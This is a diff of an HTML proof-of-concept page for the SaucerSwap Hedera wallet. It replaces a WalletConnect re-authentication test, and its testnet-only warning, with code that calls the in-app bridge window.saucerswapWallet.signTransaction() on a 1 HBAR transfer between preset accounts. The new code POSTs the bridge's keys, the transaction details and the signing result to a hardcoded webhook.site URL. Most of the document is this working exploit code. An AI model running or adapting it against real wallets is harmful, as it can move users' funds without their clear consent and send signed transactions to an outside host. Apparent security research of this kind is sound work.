@@ -2,44 +2,28 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>SaucerSwap Wallet — WalletConnect Unauthenticated Signing PoC</title>
 <script src="https://unpkg.com/@hiero-ledger/sdk@2.70.0/dist/umd.js"></script>
 <style>
   body { font-family: -apple-system, sans-serif; max-width: 640px; margin: 0 auto; padding: 16px; }
-  input { width: 100%; padding: 6px; margin: 4px 0 12px; box-sizing: border-box; }
-  button { padding: 10px 14px; margin: 6px 6px 6px 0; font-weight: 600; }
-  #uri { word-break: break-all; background: #eee; padding: 8px; font-family: monospace; font-size: 12px; margin: 8px 0; }
-  #log { background: #111; color: #0f0; padding: 10px; font-size: 12px; white-space: pre-wrap; word-break: break-all; height: 300px; overflow-y: auto; }
-  .warn { background: #fff3cd; border: 1px solid #d29922; padding: 10px; font-size: 13px; margin-bottom: 16px; }
+  input { width: 100%; padding: 8px; margin: 4px 0 12px; box-sizing: border-box; font-size: 16px; }
+  button { padding: 14px 18px; margin: 6px 0; font-weight: 700; font-size: 16px; width: 100%; }
+  #log { background: #111; color: #0f0; padding: 10px; font-size: 11px; white-space: pre-wrap; word-break: break-all; height: 350px; overflow-y: auto; margin-top: 12px; }
 </style>
 </head>
 <body>
  
-<h1>SaucerSwap Wallet — Unauthenticated Signing PoC</h1>
-<p>Pairs via WalletConnect, then sends a real <code>signAndExecuteTransaction</code> request
-(small testnet HBAR transfer) to confirm whether the wallet requires re-authentication
-before signing a request from an already-paired external dApp.</p>
+<h1>In-App Bridge Test → Webhook</h1>
+<p>Calls <code>window.saucerswapWallet.signTransaction()</code> directly and forwards
+the result to your webhook (no devtools needed to see it).</p>
  
-<div class="warn">
-  <strong>Testnet + throwaway account only.</strong> This sends a real transaction if the
-  wallet signs it. Never pair an account holding anything you care about. Discard the
-  paired account after this test.
-</div>
+<p>Webhook URL:</p>
+<input id="webhookUrl" value="https://webhook.site/89541966-2677-41d6-985f-879b2c5f67d2">
  
-<p>WalletConnect Project ID: <input id="projectId" placeholder="from cloud.walletconnect.com"></p>
-<p>Network: <input id="network" value="testnet"></p>
-<button onclick="connectWallet()">Connect Wallet</button>
-<div id="uri"></div>
+<p>Owner: <input id="ownerId" value="0.0.10190152"></p>
+<p>Recipient: <input id="recipientId" value="0.0.10130162"></p>
+<p>Amount (tinybars): <input id="amountTinybars" value="100000000"></p>
  
-<hr>
- 
-<p>Owner (paired account — auto-filled after pairing): <input id="ownerId" value="0.0.10190152"></p>
-<p>Recipient (second account you control): <input id="recipientId" value="0.0.10130162"></p>
-<p>Amount to transfer (tinybars — default 1 HBAR = 100000000): <input id="amountTinybars" value="100000000"></p>
- 
-<button onclick="checkBalance('owner')">3. Check owner balance (before)</button>
-<button onclick="sendSignAndExecute()">4. Send signAndExecuteTransaction</button>
-<button onclick="checkBalance('owner')">5. Check owner balance (after)</button>
+<button onclick="runTest()">Call signTransaction() → forward result to webhook</button>
  
 <pre id="log"></pre>
  
@@ -48,149 +32,40 @@ function log(msg) {
   const el = document.getElementById('log');
   el.textContent += new Date().toISOString() + " - " + msg + "\n";
   el.scrollTop = el.scrollHeight;
-  console.log(msg);
 }
  
-const HEDERA_METHODS = {
-  SIGN_MESSAGE: 'hedera_signMessage',
-  SIGN_AND_EXECUTE_TRANSACTION: 'hedera_signAndExecuteTransaction',
-  EXECUTE_TRANSACTION: 'hedera_executeTransaction',
-  SIGN_AND_EXECUTE_QUERY: 'hedera_signAndExecuteQuery'
-};
- 
-let signClient = null;
-let session = null;
-let pairedAccountId = null;
-let network = 'testnet';
- 
-function bytesToBase64(bytes) {
-  let binary = '';
-  const len = bytes.byteLength || bytes.length;
-  for (let i = 0; i < len; i++) binary += String.fromCharCode(bytes[i]);
-  return btoa(binary);
-}
- 
-async function connectWallet() {
-  const projectId = document.getElementById('projectId').value.trim();
-  network = document.getElementById('network').value.trim() || 'testnet';
-  if (!projectId) { log('ERROR: enter a WalletConnect Project ID first.'); return; }
- 
-  log('Loading WalletConnect SignClient + Modal…');
+async function postToWebhook(label, data) {
+  const url = document.getElementById('webhookUrl').value.trim();
+  if (!url) { log('No webhook URL set.'); return; }
   try {
-    const [signMod, modalMod] = await Promise.all([
-      import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
-      import('https://esm.sh/@walletconnect/modal@2.6.2')
-    ]);
-    const SignClient = signMod.SignClient;
-    const WalletConnectModal = modalMod.WalletConnectModal;
- 
-    if (!signClient) {
-      signClient = await SignClient.init({
-        projectId,
-        metadata: {
-          name: 'SaucerSwap Wallet Security PoC',
-          description: 'Authorized research — WalletConnect auth-gate verification',
-          url: 'https://nathanogaga118.github.io',
-          icons: []
-        }
-      });
-      log('SignClient initialized.');
-      signClient.on('session_delete', () => { log('WARNING: session was disconnected by the wallet.'); session = null; });
-    }
- 
-    const chainId = 'hedera:' + network;
-    log('Requesting session proposal (chain: ' + chainId + ')…');
-    const { uri, approval } = await signClient.connect({
-      requiredNamespaces: {
-        hedera: {
-          methods: Object.values(HEDERA_METHODS),
-          chains: [chainId],
-          events: ['chainChanged', 'accountsChanged']
-        }
-      }
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ label, timestamp: new Date().toISOString(), data })
     });
- 
-    const modal = new WalletConnectModal({ projectId, chains: [chainId] });
- 
-    if (uri) {
-      modal.openModal({ uri });
-      log('WalletConnect modal opened (QR fallback).');
- 
-      // Verified Universal Link — confirmed via SaucerSwap's own
-      // .well-known/apple-app-site-association (paths: /wc, /wc/*) and
-      // assetlinks.json (package: com.saucerswap.mobile). This is
-      // domain-verified, so the OS routes it directly to SaucerSwap only —
-      // unlike the generic wc: scheme, it cannot be intercepted by MetaMask
-      // or any other WalletConnect-capable app.
-      const universalLink = 'https://saucerswap.finance/wc?uri=' + encodeURIComponent(uri);
- 
-      document.getElementById('uri').innerHTML =
-        '<a href="' + universalLink + '" target="_blank" style="display:block;font-weight:700;font-size:16px;margin-bottom:8px;">' +
-          'TAP HERE to open SaucerSwap directly (verified Universal Link)' +
-        '</a>' +
-        '<div style="font-size:11px;word-break:break-all;color:#666;margin-bottom:8px;">' + universalLink + '</div>' +
-        '<button type="button" onclick="navigator.clipboard.writeText(\'' + uri + '\'); log(\'Raw wc: URI copied to clipboard.\')">Copy raw URI (fallback)</button>';
- 
-      log('Universal Link generated — tap the link above ON YOUR PHONE. This routes directly to SaucerSwap and cannot be intercepted by MetaMask.');
-    }
- 
-    log('Waiting for wallet approval (2 minute timeout)…');
-    const t0 = performance.now();
-    const timeoutMs = 120000;
-    const timeout = new Promise((_, reject) =>
-      setTimeout(() => reject(new Error('Timed out after ' + (timeoutMs / 1000) +
-        's waiting for wallet approval.')), timeoutMs)
-    );
-    session = await Promise.race([approval(), timeout]);
-    modal.closeModal();
-    log('Session approved. (' + (performance.now() - t0).toFixed(0) + 'ms)');
- 
-    const accounts = Object.values(session.namespaces).map(ns => ns.accounts).flat();
-    log('Paired accounts: ' + JSON.stringify(accounts));
-    if (accounts.length > 0) {
-      pairedAccountId = accounts[0].split(':')[2];
-      document.getElementById('ownerId').value = pairedAccountId;
-      log('Owner field set to paired account: ' + pairedAccountId);
-    }
+    log('POSTed "' + label + '" to webhook.');
   } catch (e) {
-    log('Connect failed: ' + e.message);
+    log('Webhook POST failed: ' + e.message);
   }
 }
  
-async function checkBalance(which) {
-  const accountId = document.getElementById('ownerId').value.trim();
-  if (!accountId) { log('ERROR: no account id set.'); return; }
+async function runTest() {
   try {
-    const mirrorBase = network === 'mainnet'
-      ? 'https://mainnet-public.mirrornode.hedera.com'
-      : 'https://' + network + '.mirrornode.hedera.com';
-    const res = await fetch(mirrorBase + '/api/v1/accounts/' + accountId);
-    if (!res.ok) throw new Error('Mirror Node HTTP ' + res.status);
-    const info = await res.json();
-    const hbarBalance = info.balance ? info.balance.balance : 'unknown';
-    log('Balance check (' + which + ') for ' + accountId + ': ' + hbarBalance + ' tinybars');
-  } catch (e) {
-    log('Balance check failed: ' + e.message);
-  }
-}
+    if (!window.saucerswapWallet) {
+      log('window.saucerswapWallet NOT present in this context.');
+      await postToWebhook('bridge_missing', { present: false });
+      return;
+    }
+    log('window.saucerswapWallet is present. Keys: ' + Object.keys(window.saucerswapWallet).join(', '));
+    await postToWebhook('bridge_present', { keys: Object.keys(window.saucerswapWallet) });
  
-async function sendSignAndExecute() {
-  if (!signClient || !session || !pairedAccountId) {
-    log('ERROR: pair first (step 2) before sending a request.');
-    return;
-  }
-  try {
     const { TransferTransaction, AccountId, Hbar, TransactionId } = sdk;
- 
     const ownerStr = document.getElementById('ownerId').value.trim();
     const recipientStr = document.getElementById('recipientId').value.trim();
     const amountTinybars = document.getElementById('amountTinybars').value.trim();
  
     const owner = AccountId.fromString(ownerStr);
     const recipient = AccountId.fromString(recipientStr);
- 
-    log('Building TransferTransaction: ' + ownerStr + ' -> ' + recipientStr +
-        ', amount=' + amountTinybars + ' tinybars');
  
     const tx = new TransferTransaction()
       .addHbarTransfer(owner, Hbar.fromTinybars(-amountTinybars))
@@ -200,45 +75,36 @@ async function sendSignAndExecute() {
       .freeze();
  
     const bytes = tx.toBytes();
-    const base64Bytes = bytesToBase64(bytes);
-    log('Built transaction bytes (base64), length: ' + base64Bytes.length);
+    let binary = '';
+    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+    const base64Bytes = btoa(binary);
  
-    const chainId = 'hedera:' + network;
-    const request = {
-      topic: session.topic,
-      chainId,
-      request: {
-        method: HEDERA_METHODS.SIGN_AND_EXECUTE_TRANSACTION,
-        params: {
-          signerAccountId: chainId + ':' + ownerStr,
-          // NOTE: confirm this param name against the wallet's actual
-          // hedera-wallet-connect implementation before relying on it —
-          // spec commonly uses `transactionList` for base64-encoded tx bytes.
-          transactionList: base64Bytes
-        }
-      }
-    };
+    log('Built transaction, base64 length: ' + base64Bytes.length);
+    log('⏱ Calling signTransaction() now — watch the device for any prompt.');
  
-    log('⏱ Sending ' + HEDERA_METHODS.SIGN_AND_EXECUTE_TRANSACTION +
-        ' now — OBSERVE THE DEVICE for any biometric/PIN prompt starting this instant.');
-    const t0 = performance.now();
     const sentAt = new Date().toISOString();
+    const t0 = performance.now();
+    await postToWebhook('signTransaction_called', { sentAt, owner: ownerStr, recipient: recipientStr, amountTinybars });
  
-    const result = await signClient.request(request);
- 
-    const elapsed = (performance.now() - t0).toFixed(0);
-    log('Response received after ' + elapsed + 'ms (sent at ' + sentAt + ').');
-    log('Raw response: ' + JSON.stringify(result));
-    log('If no prompt appeared on-device between the "Sending" line above and this ' +
-        'response, the request was signed and executed without re-authentication.');
-    log('Run step 5 (balance check) now and compare against step 3 to confirm on-chain movement.');
+    window.saucerswapWallet.signTransaction(base64Bytes)
+      .then(async (result) => {
+        const elapsed = (performance.now() - t0).toFixed(0);
+        const receivedAt = new Date().toISOString();
+        log('signTransaction() RESOLVED after ' + elapsed + 'ms: ' + JSON.stringify(result));
+        await postToWebhook('signTransaction_resolved', { sentAt, receivedAt, elapsedMs: elapsed, result });
+      })
+      .catch(async (err) => {
+        const elapsed = (performance.now() - t0).toFixed(0);
+        const receivedAt = new Date().toISOString();
+        log('signTransaction() REJECTED after ' + elapsed + 'ms: ' + err.message);
+        await postToWebhook('signTransaction_rejected', { sentAt, receivedAt, elapsedMs: elapsed, message: err.message });
+      });
   } catch (e) {
-    log('Request failed/rejected: ' + e.message);
-    console.error(e);
+    log('Error: ' + e.message);
+    await postToWebhook('script_error', { message: e.message });
   }
 }
 </script>
  
 </body>
 </html>
- 
